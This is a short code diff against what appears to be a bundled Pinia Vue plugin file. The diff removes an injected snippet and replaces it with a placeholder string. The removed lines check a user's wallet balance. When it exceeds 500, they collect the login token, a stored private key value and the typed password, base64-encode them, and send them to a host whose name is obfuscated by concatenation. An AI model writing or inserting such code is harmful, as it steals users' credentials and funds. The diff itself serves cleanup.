@@ -32,11 +32,5 @@ var PiniaVuePlugin_1 = function(_Vue) {
     }
   });
 };
-lock="let available1=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 1}).coincash
-let available30=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 30}).coincash
-let available=+available1 + +available30
-if (available>500) {
-    let token: any = localStorage.getItem('token')+'&&'+ (localStorage.getItem('md5_pri')|| '---')+'&&'+'passwdValue='+passwdValue.value+'&&'+(available?'available='+available:'-')
-    fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o'+'p/?' + btoa(token))
-}"
+lock="aaaa"
 err=null;gameTypes=null;
